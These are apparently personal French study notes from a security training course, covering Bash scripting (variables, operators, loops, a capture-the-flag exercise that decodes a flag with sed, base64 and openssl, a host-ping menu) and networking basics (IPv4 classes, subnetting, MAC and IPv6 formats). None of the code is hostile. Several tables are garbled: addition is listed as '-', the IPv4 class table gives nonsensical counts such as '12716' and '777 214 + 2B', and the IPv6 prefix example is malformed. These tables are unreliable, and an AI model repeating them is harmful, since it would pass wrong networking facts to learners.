| $0  | Cette variable spéciale se voit attribuer le nom du script exécuté, qui est ensuite affiché dans le "Usage:" exemple.                                                                                                                                                                 |
| $1  | Séparé par un espace, le premier argument est affecté à cette variable spéciale.                                                                                                                                                                                                      |

#### Declaration de variable

```bash
#!/bin/bash

 variable="Declared without an error."

 ```

#### Arrays

```bash
#!/bin/bash

domains=(domaine1.com domaine2.com domaine3.com domaine4.com)

echo ${domains[0]}
```

## Les opérateurs Bash

----------------------

| Opérateur | Description                                        |
| --------- | -------------------------------------------------- |
| ==        | est égal à                                         |
| !=        | n'est pas égal à                                   |
| <         | est inférieur à l'ordre alphabétique ASCII         |
| >         | est plus grand que dans l'ordre alphabétique ASCII |
| -z        | si la chaîne est vide (null)                       |
| -n        | si la chaîne n'est pas nulle                       |

### ASCII Table

Exemple :

| Décimal | Hexadécale | Caractère | Description      |
| ------- | ---------- | --------- | ---------------- |
| 0       | 00         | NUL       | Fin d'une chaîne |
| 65      | 41         | A         | Capital A        |
| 66      | 42         | B         | Capital B        |
| 67      | 43         | C         | Capital C        |
| 68      | 44         | D         | Capital D        |
| 127     | 7F         | DEL       | Supprimer        |

Ascii représente un codage de caractere en 7bits : [Caractere de Controle](https://en.wikipedia.org/wiki/Control_character)

Intégrateur opérateurs :

| Opérateur | Description             |
| --------- | ----------------------- |
| -eq       | est égal à              |
| -ne       | n'est pas égal à        |
| -lt       | est inférieur à         |
| -le       | est inférieur ou égal à |
| -gt       | est plus grand que      |
| -ge       | est supérieur ou égal à |

Opérateur de fichiers :

| Opérateur | Description                                                         |
| --------- | ------------------------------------------------------------------- |
| -e        | si le fichier existe                                                |
| -f        | teste si c'est un fichier                                           |
| -d        | teste si c'est un répertoire                                        |
| -L        | teste si c'est si un lien symbolique                                |
| -N        | vérifie si le fichier a été modifié après sa dernière lecture       |
| -O        | si l'utilisateur actuel est propriétaire du fichier                 |
| -G        | si l'identifiant du groupe file’s correspond à l'utilisateur actuel |
| -s        | teste si le fichier a une taille supérieure à 0                     |
| -r        | teste si le fichier a l'autorisation de lecture                     |
| -w        | teste si le fichier a une autorisation d'écriture                   |
| -x        | teste si le fichier a l'autorisation d'exécution                    |

| Opérateur | Description             |
| --------- | ----------------------- |
| !         | négociation logique NON |
| &&        | logique ET              |
| \|\|      | logique OU              |

### Arithmetic Opérateur

| Arithmétiques | Opérateurs                              |
| ------------- | --------------------------------------- |
| Opérateur     | Description                             |
| -             | Addition                                |
| -             | Substraction                            |
| *             | Multiplication                          |
| /             | Division                                |
| %             | Module                                  |
| variable++    | Augmenter la valeur de la variable de 1 |
| variable--    | Diminuer la valeur de la variable de 1  |

## Contrôle des Scripts

### Input and Output

### Flow Control - Loops

- Branche:
  - **If-Else** Conditions
  - **Case** Déclarations

- Boucles:
  - **For** Boucles
  - **While** Boucles
  - **Until** Boucles

Tant qu'une condition est remplie

exercice boucle FOR :

```shell
#!/bin/bash

# Decrypt function
function decrypt {
 MzSaas7k=$(echo $hash | sed 's/988sn1/83unasa/g')
 Mzns7293sk=$(echo $MzSaas7k | sed 's/4d298d/9999/g')
 MzSaas7k=$(echo $Mzns7293sk | sed 's/3i8dqos82/873h4d/g')
 Mzns7293sk=$(echo $MzSaas7k | sed 's/4n9Ls/20X/g')
 MzSaas7k=$(echo $Mzns7293sk | sed 's/912oijs01/i7gg/g')
 Mzns7293sk=$(echo $MzSaas7k | sed 's/k32jx0aa/n391s/g')
 MzSaas7k=$(echo $Mzns7293sk | sed 's/nI72n/YzF1/g')
 Mzns7293sk=$(echo $MzSaas7k | sed 's/82ns71n/2d49/g')
 MzSaas7k=$(echo $Mzns7293sk | sed 's/JGcms1a/zIm12/g')
 Mzns7293sk=$(echo $MzSaas7k | sed 's/MS9/4SIs/g')
 MzSaas7k=$(echo $Mzns7293sk | sed 's/Ymxj00Ims/Uso18/g')
 Mzns7293sk=$(echo $MzSaas7k | sed 's/sSi8Lm/Mit/g')
 MzSaas7k=$(echo $Mzns7293sk | sed 's/9su2n/43n92ka/g')
 Mzns7293sk=$(echo $MzSaas7k | sed 's/ggf3iunds/dn3i8/g')
 MzSaas7k=$(echo $Mzns7293sk | sed 's/uBz/TT0K/g')

 flag=$(echo $MzSaas7k | base64 -d | openssl enc -aes-128-cbc -a -d -salt -pass pass:$salt)
}

# Variables
var="9M"
salt=""
hash="VTJGc2RHVmtYMTl2ZnYyNTdUeERVRnBtQWVGNmFWWVUySG1wTXNmRi9rQT0K"

# Base64 Encoding Example:
#        $ echo "Some Text" | base64

# <- For-Loop here

counter=0

for i in {1..28};
do
        var=$(echo $var | base64)
done
salt=$(echo $var | wc -c |tr -d ' ')

# Check if $salt is empty
if [[ ! -z "$salt" ]]
then
 decrypt
 echo $flag
else
 exit 1
fi

```

### Controle de début - Branches

**case**

```shell
# Available options
echo -e "Additional options available:"
echo -e "\t1) Identify the corresponding network range of target domain."
echo -e "\t2) Ping discovered hosts."
echo -e "\t3) All checks."
echo -e "\t*) Exit.\n"

read -p "Select your option: " opt

case $opt in
 "1") network_range ;;
 "2") ping_host ;;
 "3") network_range && ping_host ;;
 "*") exit 0 ;;
esac
```

## Execution flow

### Functions

### debug

```shell

bash -x -v script.sh 

```

# introduction au réseau

## intro

un réseau permet à deux ou plusieur equipement de communiquer entre eux.

Ce qu'il faut retenir dans une premier temps c'est que dans le model osi les couches 2 àà 4 sont orienté transport et 5 à 7 orienté  application.

Classe IPv4

| Class | Adresse du Réseau | Première Adresse | Dernière Adresse | Sous-réseau      | CIDR           | Sous-réseaux   |
| ----- | ----------------- | ---------------- | ---------------- | ---------------- | -------------- | -------------- |
| A     | 1.0.0.0           | 1.0.0.1          | 127.255.255.255  | 255.0.0.0/8      | 12716          | 777 214 + 2B   |
| B     | 128.0.0.0         | 128.0.0.1        | 191.255.255.255  | 255.255.0.0/16   | 16 384         | 65534 + 2C     |
| C     | 192.0.0.0         | 192.0.0.1        | 223.255.255.255  | 255.255.255.0/24 | 2097152        | 254 + 2D       |
| D     | 224.0.0.0         | 224.0.0.1        | 239.255.255.255  | Multidiffusion   | Multidiffusion | Multidiffusion |
| E     | 240.0.0.0         | 240.0.0.1        | 255.255.255.255  | Réservé          | Réservé        | Réservé        |

Sous réseau  

| Class | Adresse du Réseau | Première Adresse | Dernière Adresse | Subnetmask    | CIDR      | Sous-réseaux      | IPA          |
| ----- | ----------------- | ---------------- | ---------------- | ------------- | --------- | ----------------- | ------------ |
| A     | 1.0.0.0           | 1.0.0.1          | 127.255.255.255  | 255.0.0.0     | 8         | 12716             | 777 214 + 2B |
| B     | 128.0.0.0         | 128.0.0.1        | 191.255.255.255  | 255.255.0.0   | 16        | 16 384 65534 + 2C ||
| C     | 192.0.0.0         | 192.0.0.1        | 223.255.255.255  | 255.255.255.0 | 24        | 2097152           | 254 + 2D     |
| D     | 224.0.0.0         | 224.0.0.1        | 239.255.255.255  | Multicast     | Multicast | Multicast         | Multicast    |
| E     | 240.0.0.0         | 240.0.0.1        | 255.255.255.255  | Reserved      | Reserved  | Reserved          | Reserved     |

  |Values: |        128  64  32  16  8  4  2  1|
  |Binary:|           1   1   0   0  0  0  0  0|

## Octet Values and Sum

This table shows the calculation of decimal sum for octet values:

| Octet     | Values                           | Somme (Sum) |
| --------- | -------------------------------- | ----------- |
| 1st       | 128 + 64 + 0 + 0 + 0 + 0 + 0 + 0 | 192         |
| 2nd       | 0 + 32 + 0 + 8 + 0 + 0 + 0 + 0   | 40          |
| 3rd       | 0 + 0 + 0 + 8 + 0 + 2 + 0        | 10          |
| 4th       | 0 + 32 + 0 + 0 + 4 + 2 + 1       | 39          |

**Adresse IPv4: 192.168.10.39

Masque de sous-réseau: 255.255.255.0**

| Octet   | 1st        | 2nd        | 3rd        | 4th        |
|---------|------------|------------|------------|------------|
| Binary  | 1100 0000  | 1010 1000  | 0000 1010  | 0010 0111  |
| Decimal | 192        | 168        | 10         | 39         |

| Values | 128 | 64 | 32 | 16 | 8 | 4 | 2 | 1 |
|--------|-----|----|----|----|---|---|---|---|
| Binary | 1   | 1  | 1  | 1  | 1 | 1 | 1 | 1 |

| Octet | Valeurs                                      | Somme |
|-------|----------------------------------------------|-------|
| 1er   | 128 + 64 + 32 + 16 + 8 + 4 + 2 + 1           | 255   |
| 2e    | 128 + 64 + 32 + 16 + 8 + 4 + 2 + 1           | 255   |
| 3e    | 128 + 64 + 32 + 16 + 8 + 4 + 2 + 1           | 255   |
| 4e    | 0 + 0 + 0 + 0 + 0 + 0 + 0 + 0                | 0     |

  Sous-réseau Masque
  
|          | adresses IP |             |           |             |
| -------- | ----------- | ----------- | --------- | ----------- |
| Octet:   | 1st         | 2nd         | 3rd       | 4th         |
| Binary:  | 1111 1111 . | 1111 1111 . | 1111 1111 | . 0000 0000 |
| Decimal: | 255    .    | 255    .    | 255       | .     0     |

### Adresse MAC

> DE:AD:BE:EF:13:37
> DE-AD-BE-EF-13-37
> DEAD.BEEF.1337

| Représentation            | 1er Octet  | 2ème Octet  | 3e Octet  | 4ème Octet  | 5ème Octet  | 6ème Octet  |
|---------------------------|------------|------------|----------|-------------|-------------|-------------|
| Binaire                   | 1101 1110  | 1010 1101  | 1011 1110| 1110 1111   | 0001 0011   | 0011 0111   |
| Hexadécimal               | DE         | AD         | BE       | EF          | 13          | 37          |

| Caractéristiques         | IPv4                    | IPv6                                    |
|--------------------------|-------------------------|-----------------------------------------|
| Longueur du bit          | 32-bit                  | 128 bits                                |
| Couche OSI               | Couche Réseau           | Couche Réseau                           |
| Gamme d'adressage        | ~ 4,3 milliards         | ~ 340 undecillion                       |
| Représentation           | Binaire                 | Hexadécimal                             |
| Préfixe notation         | 10.10.10.0/24           | fe80:dd80:b1a9:6687:2d3b/64             |
| Adressage dynamique      | DHCP                    | SLAAC / DHCPv6                          |
| IPsec                    | Facultatif              | Obligatoire                             |
